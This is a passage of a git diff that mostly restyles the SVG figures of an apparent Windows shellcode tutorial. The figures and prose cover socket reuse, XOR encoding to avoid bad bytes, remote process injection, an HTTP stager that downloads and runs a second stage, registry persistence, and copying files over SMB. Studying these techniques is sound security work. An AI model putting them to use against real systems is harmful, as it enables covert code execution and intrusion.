font-family="Consolas,monospace" font-size="10" text-anchor="middle">Not a socket</text><line x1="520" y1="80" x2="555" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="560" y="55" width="155" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="637" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">sin_port == 0x5C11?</text><text x="637" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(port 4444)</text><rect x="220" y="145" width="310" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/><text x="375" y="170" fill="#00ff88" font-family="Consolas,monospace" font-size="12" text-anchor="middle" font-weight="bold">MATCH! Use handle for STARTUPINFOA</text><text x="375" y="188" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">All I/O flows through original exploit socket</text><line x1="637" y1="105" x2="530" y2="155" stroke="#00ff88" stroke-width="2"/><text x="600" y="135" fill="#00ff88" font-family="Consolas,monospace" font-size="10">YES</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="border-radius:8px"><defs><marker id="ah13" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Socket Reuse: Handle Enumeration</text><rect x="30" y="55" width="130" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="95" y="85" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">handle = 0x50</text><line x1="160" y1="80" x2="195" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="200" y="55" width="165" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="282" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">getpeername(handle,</text><text x="282" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">&addr, &len)</text><line x1="365" y1="80" x2="395" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="400" y="55" width="120" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/><text x="460" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Return != 0?</text><text x="460" y="92" fill="#ff3366" font-family="Consolas,monospace" font-size="10" text-anchor="middle">Not a socket</text><line x1="520" y1="80" x2="555" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="560" y="55" width="155" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="637" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">sin_port == 0x5C11?</text><text x="637" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(port 4444)</text><rect x="220" y="145" width="310" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/><text x="375" y="170" fill="#00ff88" font-family="Consolas,monospace" font-size="12" text-anchor="middle" font-weight="bold">MATCH! Use handle for STARTUPINFOA</text><text x="375" y="188" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">All I/O flows through original exploit socket</text><line x1="637" y1="105" x2="530" y2="155" stroke="#00ff88" stroke-width="2"/><text x="600" y="135" fill="#00ff88" font-family="Consolas,monospace" font-size="10">YES</text></svg></div>
 
 *Figure 13.1 - Socket reuse: scan handles, test with getpeername, match port, redirect stdio.*
 
@@ -2143,7 +2279,13 @@ The **`loop`** instruction decrements ECX by 1 and jumps if non-zero. After all 
 The key must itself be a safe byte, and XOR-ing every payload byte with it must produce only safe bytes.
 
 <div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s114" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s114"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s114" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="260" rx="10" fill="url(#bg_s114)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s114)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">XOR Key Selection</text>
   <!-- Original payload -->
   <text x="100" y="58" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Original Payload</text>
@@ -2196,7 +2338,7 @@ for key in range(1, 256):
         break
 ```
 
-<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#0a0e17;border-radius:8px"><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">XOR Decode Loop (key = 0xAA)</text><text x="60" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Iter</text><text x="180" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Before</text><text x="340" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Operation</text><text x="510" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">After</text><rect x="20" y="85" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">1</text><text x="180" y="109" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8</text><text x="340" y="109" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8 XOR 0xAA</text><text x="510" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x72 = 'r'</text><rect x="20" y="128" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">2</text><text x="180" y="152" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF</text><text x="340" y="152" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF XOR 0xAA</text><text x="510" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x65 = 'e'</text><rect x="20" y="171" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">3</text><text x="180" y="195" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7</text><text x="340" y="195" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7 XOR 0xAA</text><text x="510" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6D = 'm'</text><rect x="20" y="214" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">4</text><text x="180" y="238" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5</text><text x="340" y="238" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5 XOR 0xAA</text><text x="510" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6F = 'o'</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="border-radius:8px"><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">XOR Decode Loop (key = 0xAA)</text><text x="60" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Iter</text><text x="180" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Before</text><text x="340" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Operation</text><text x="510" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">After</text><rect x="20" y="85" width="710" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">1</text><text x="180" y="109" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8</text><text x="340" y="109" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8 XOR 0xAA</text><text x="510" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x72 = 'r'</text><rect x="20" y="128" width="710" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">2</text><text x="180" y="152" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF</text><text x="340" y="152" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF XOR 0xAA</text><text x="510" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x65 = 'e'</text><rect x="20" y="171" width="710" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">3</text><text x="180" y="195" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7</text><text x="340" y="195" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7 XOR 0xAA</text><text x="510" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6D = 'm'</text><rect x="20" y="214" width="710" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">4</text><text x="180" y="238" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5</text><text x="340" y="238" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5 XOR 0xAA</text><text x="510" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6F = 'o'</text></svg></div>
 
 *Figure 14.1 - Each iteration XORs one encoded byte back to its original value.*
 
@@ -2242,8 +2384,10 @@ find_process:
 ```
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="280" rx="8" fill="#0a0e17"/>
+<defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>    <linearGradient id="bg_s207" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s207"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s207" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s207)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s207)"/>
 <text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Process Injection Chain</text>
 <rect x="30" y="55" width="140" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="100" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">1. Snapshot</text>
@@ -2279,11 +2423,14 @@ find_process:
 Once we locate the target PID, the injection writes our shellcode into the remote process's address space and starts a thread there.
 
 <div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs>
-  <marker id="ah15b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+  <defs>
+    <linearGradient id="bg_s215" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s215"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s215" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+    <marker id="ah15b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
   <marker id="ah15c" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff3366"/></marker>
-</defs>
-<rect width="750" height="360" rx="8" fill="#0a0e17"/>
+    <linearGradient id="bg_s208" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s208"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s208" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="360" rx="10" fill="url(#bg_s208)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s208)"/>
 <text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Cross-Process Injection Memory Layout</text>
 <!-- Source process -->
 <rect x="30" y="50" width="280" height="250" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -2297,7 +2444,7 @@ Once we locate the target PID, the injection writes our shellcode into the remot
 <rect x="50" y="235" width="240" height="30" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
 <text x="170" y="255" fill="#00ff88" font-size="10" text-anchor="middle">WriteProcessMemory(hProc, remoteAddr, sc)</text>
 <!-- Arrow -->
-<line x1="310" y1="110" x2="430" y2="110" stroke="#ff3366" stroke-width="2.5" stroke-dasharray="8,4" marker-end="url(#ah15c)"/>
+<line x1="310" y1="110" x2="430" y2="110" stroke="#ff3366" stroke-width="2" stroke-dasharray="8,4" marker-end="url(#ah15c)"/>
 <text x="370" y="100" fill="#ff3366" font-size="10" text-anchor="middle">WriteProcessMemory</text>
 <line x1="310" y1="250" x2="430" y2="200" stroke="#00ff88" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#ah15b)"/>
 <text x="370" y="240" fill="#00ff88" font-size="10" text-anchor="middle">CreateRemoteThread</text>
@@ -2312,7 +2459,7 @@ Once we locate the target PID, the injection writes our shellcode into the remot
 <text x="575" y="210" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">New Thread starts here</text>
 <text x="575" y="225" fill="#00ff88" font-size="9" text-anchor="middle">lpStartAddress = remoteAddr</text>
 <!-- Legend -->
-<rect x="160" y="318" width="430" height="30" rx="5" fill="#0a0e17" stroke="#8b949e" stroke-width="1"/>
+<rect x="160" y="318" width="430" height="30" rx="6" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
 <text x="375" y="338" fill="#e0e7ff" font-size="10" text-anchor="middle">Our code runs inside notepad.exe -- survives even if the exploit process exits</text>
 </svg></div>
 
@@ -2362,8 +2509,10 @@ read_loop:
 Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps the process alive.
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="280" rx="8" fill="#0a0e17"/>
+<defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>    <linearGradient id="bg_s209" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s209"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s209" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s209)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s209)"/>
 <text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">HTTP Stager Flow</text>
 <rect x="30" y="55" width="140" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="100" y="80" fill="#e0e7ff" font-size="10" text-anchor="middle">LoadLibraryA</text>
@@ -2393,26 +2542,28 @@ Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps
 Each iteration reads up to 4096 bytes. The buffer pointer advances by the number of bytes actually read so data is written contiguously.
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah16b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="280" rx="8" fill="#0a0e17"/>
+<defs><marker id="ah16b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>    <linearGradient id="bg_s210" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s210"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s210" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s210)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s210)"/>
 <text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">InternetReadFile: Buffer Filling Loop</text>
 <!-- Memory bar -->
-<rect x="50" y="55" width="650" height="40" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="50" y="55" width="650" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="375" y="80" fill="#00d4ff" font-size="11" text-anchor="middle">VirtualAlloc'd RWX buffer (total size for second stage)</text>
 <!-- Iteration 1 -->
-<rect x="50" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
+<rect x="50" y="110" width="160" height="35" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
 <text x="130" y="132" fill="#00ff88" font-size="10" text-anchor="middle" font-weight="bold">Iter 1: 4096 B</text>
 <line x1="130" y1="95" x2="130" y2="110" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16b)"/>
 <!-- Iteration 2 -->
-<rect x="215" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
+<rect x="215" y="110" width="160" height="35" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
 <text x="295" y="132" fill="#ff6b35" font-size="10" text-anchor="middle" font-weight="bold">Iter 2: 4096 B</text>
 <line x1="295" y1="95" x2="295" y2="110" stroke="#ff6b35" stroke-width="1.5"/>
 <!-- Iteration 3 -->
-<rect x="380" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+<rect x="380" y="110" width="160" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
 <text x="460" y="132" fill="#ff3366" font-size="10" text-anchor="middle" font-weight="bold">Iter 3: 4096 B</text>
 <line x1="460" y1="95" x2="460" y2="110" stroke="#ff3366" stroke-width="1.5"/>
 <!-- Iteration N -->
-<rect x="545" y="110" width="155" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="4,3"/>
+<rect x="545" y="110" width="155" height="35" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="4,3"/>
 <text x="622" y="132" fill="#8b949e" font-size="10" text-anchor="middle">Iter N: &lt;4096 B</text>
 <!-- Pointer arrows -->
 <text x="50" y="170" fill="#e0e7ff" font-size="10">[ebp+0x34] advances by bytesRead each iteration:</text>
@@ -2524,9 +2675,10 @@ The registry path string is 52 characters long. We push it as DWORDs in reverse 
 *Figure 17.2 - Each DWORD push adds 4 characters of the registry path. Because the stack grows downward, pushing in reverse order means EDI (pointing to ESP after all pushes) gives the correct forward-reading string.*
 
 <div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="260" rx="8" fill="#0a0e17"/>
-<text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Registry Persistence Flow</text>
+<defs><linearGradient id="bg_s43" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s43"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s43" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
+<rect width="750" height="260" rx="10" fill="url(#bg_s43)"/>
+<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s43)"/>
+<text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s43)">Registry Persistence Flow</text>
 <rect x="40" y="55" width="160" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="120" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">LoadLibraryA</text>
 <text x="120" y="92" fill="#ff6b35" font-size="10" text-anchor="middle">("advapi32.dll")</text>
@@ -2590,32 +2742,34 @@ load_mpr_dll:
 Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName` pointing to the UNC path on the stack.
 
 <div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<rect width="750" height="300" rx="8" fill="#0a0e17"/>
-<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">NETRESOURCEA Struct (32 bytes on stack)</text>
+<defs><linearGradient id="bg_s44" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s44"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s44" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient></defs>
+<rect width="750" height="300" rx="10" fill="url(#bg_s44)"/>
+<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s44)"/>
+<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s44)">NETRESOURCEA Struct (32 bytes on stack)</text>
 <!-- Struct fields -->
-<rect x="80" y="50" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="80" y="50" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="90" y="70" fill="#00d4ff" font-size="11">+0x00  dwScope</text>
 <text x="300" y="70" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
-<rect x="80" y="84" width="260" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+<rect x="80" y="84" width="260" height="30" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
 <text x="90" y="104" fill="#ff3366" font-size="11" font-weight="bold">+0x04  dwType</text>
 <text x="300" y="104" fill="#ff3366" font-size="10" text-anchor="end">= 1 (DISK)</text>
-<rect x="80" y="118" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="80" y="118" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="90" y="138" fill="#00d4ff" font-size="11">+0x08  dwDisplayType</text>
 <text x="300" y="138" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
-<rect x="80" y="152" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="80" y="152" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="90" y="172" fill="#00d4ff" font-size="11">+0x0C  dwUsage</text>
 <text x="300" y="172" fill="#8b949e" font-size="10" text-anchor="end">= 0</text>
-<rect x="80" y="186" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="80" y="186" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="90" y="206" fill="#00d4ff" font-size="11">+0x10  lpLocalName</text>
 <text x="300" y="206" fill="#8b949e" font-size="10" text-anchor="end">= NULL</text>
-<rect x="80" y="220" width="260" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
+<rect x="80" y="220" width="260" height="30" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
 <text x="90" y="240" fill="#00ff88" font-size="11" font-weight="bold">+0x14  lpRemoteName</text>
 <text x="300" y="240" fill="#00ff88" font-size="10" text-anchor="end">--> UNC ptr</text>
 <!-- UNC string -->
 <line x1="340" y1="235" x2="420" y2="235" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="4,3"/>
-<rect x="420" y="220" width="280" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
+<rect x="420" y="220" width="280" height="30" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
 <text x="560" y="240" fill="#00ff88" font-size="11" text-anchor="middle">\\192.168.1.1\share</text>
-<rect x="80" y="254" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+<rect x="80" y="254" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
 <text x="90" y="274" fill="#00d4ff" font-size="11">+0x18  lpComment</text>
 <text x="300" y="274" fill="#8b949e" font-size="10" text-anchor="end">= NULL</text>
 <rect x="420" y="50" width="280" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
@@ -2628,9 +2782,10 @@ Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName
 Then authenticate with `WNetAddConnection2A` and copy with `CopyFileA`.
 
